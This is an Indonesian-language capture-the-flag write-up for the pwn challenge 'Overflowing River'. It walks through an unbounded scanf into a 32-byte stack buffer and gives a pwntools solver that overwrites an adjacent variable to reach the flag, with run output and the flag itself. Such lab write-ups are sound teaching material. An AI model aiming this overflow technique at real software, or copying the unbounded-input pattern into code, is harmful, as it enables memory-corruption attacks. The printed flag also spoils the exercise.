https://gemini.google.com/share/df4d21d88966
# WriteUp: Overflowing River

## Informasi Tantangan

* **Nama Challenge:** Overflowing River
* **Kategori:** Pwn
* **Poin:** 500
* **Deskripsi:** Tantangan ini mengharuskan kita memanipulasi variabel lokal pada stack untuk mengubah alur eksekusi (Logic Bypass) dengan memicu kondisi `else`.
* **Koneksi:** `nc practice-digitalsecuritylab.di.unipi.it 10001`

## 1. Reconnaissance (Pengumpulan Informasi)

Langkah awal adalah menganalisis binary `chall` untuk memahami arsitektur dan mitigasi keamanan yang diterapkan.

### Informasi File

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e748e9cc15f42da1541e6bf52109bd3b669db73b, for GNU/Linux 4.4.0, not stripped

```

### Proteksi Keamanan

```bash
$ checksec --file=chall
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Overflowing River/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       Canary found
    NX:          NX enabled
    PIE:         PIE enabled
    Stripped:    No

```

* **Canary Found:** Stack terlindungi dari buffer overflow yang menargetkan Return Address.
* **PIE Enabled:** Alamat memori diacak.
* **NX Enabled:** Stack tidak dapat dieksekusi.

## 2. Analisis Vulnerability

Berdasarkan hasil decompile (IDA Pro), berikut adalah logika fungsi `main`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-30h] BYREF
  int v5;      // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h] (Canary)

  // ... setup ...
  v5 = -559038737; // Inisialisasi v5 (0xDEADBEEF)
  printf("Enter your name: ");
  __isoc99_scanf("%s", v4); // VULN: Input tanpa batas
  
  // Logic Check
  if ( v5 == -559038737 )
  {
    printf("Hello %s!\n", v4);
  }
  else
  {
    puts("Wait, how did you do it?"); // Target kita
    print_flag();
  }
  return 0;
}

```

**Analisis:**

1. **Variabel `v5**` diinisialisasi dengan nilai `-559038737` (Representasi signed dari `0xDEADBEEF`).
2. **Fungsi `scanf**` membaca input ke buffer `v4` tanpa batasan, memungkinkan kita menimpa data di stack yang berada di alamat memori lebih tinggi (seperti `v5`).
3. **Kondisi Eksploitasi:** Program mencetak flag hanya jika nilai `v5` **berubah** (tidak lagi sama dengan `-559038737`).
4. **Canary Bypass:** Karena pengecekan `v5` dan pemanggilan `print_flag()` terjadi sebelum fungsi return, kita tidak perlu khawatir tentang Canary check failure yang biasanya terjadi di akhir fungsi.

## 3. Kalkulasi Offset

Menghitung jarak dari buffer `v4` ke variabel target `v5`.

* Lokasi `v4`: `rbp - 0x30`
* Lokasi `v5`: `rbp - 0x10`

Kita harus mengirimkan **32 byte padding** diikuti dengan data sembarang (garbage) untuk merusak nilai `v5`.

## 4. Exploitation Script

Berikut adalah script `solver.py` yang digunakan:

```python
from pwn import *

# 1. Konfigurasi
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Koneksi ke server remote
io = remote('practice-digitalsecuritylab.di.unipi.it', 10001)

# 2. Kalkulasi Payload
# Jarak v4 ke v5 adalah 32 byte.
# Kita hanya perlu merusak nilai v5 agar tidak sama dengan -559038737.
offset = 32

# 3. Menyusun Payload
# 32 byte 'A' (Padding) + 4 byte 'B' (Overwrite v5)
payload = b'A' * offset + b'BBBB'

log.info(f"Payload length: {len(payload)}")

# 4. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 5. Mendapatkan Flag
io.interactive()

```

## 5. Hasil Eksekusi (Flag)

Eksekusi script di terminal berhasil memicu logika `else` dan mendapatkan flag:

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Digital Security Lab CTF/Pwn/Overflowing River]
└─$ python3 solver.py
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Overflowing River/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       Canary found
    NX:          NX enabled
    PIE:         PIE enabled
    Stripped:    No
[+] Opening connection to practice-digitalsecuritylab.di.unipi.it on port 10001: Done
[*] Payload length: 36
[*] Switching to interactive mode
Wait, how did you do it?
flag{n0thing_b3tter_th4n_sm4shing_the_st5ck!}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to practice-digitalsecuritylab.di.unipi.it port 10001

```

**Flag:** `flag{n0thing_b3tter_th4n_sm4shing_the_st5ck!}`
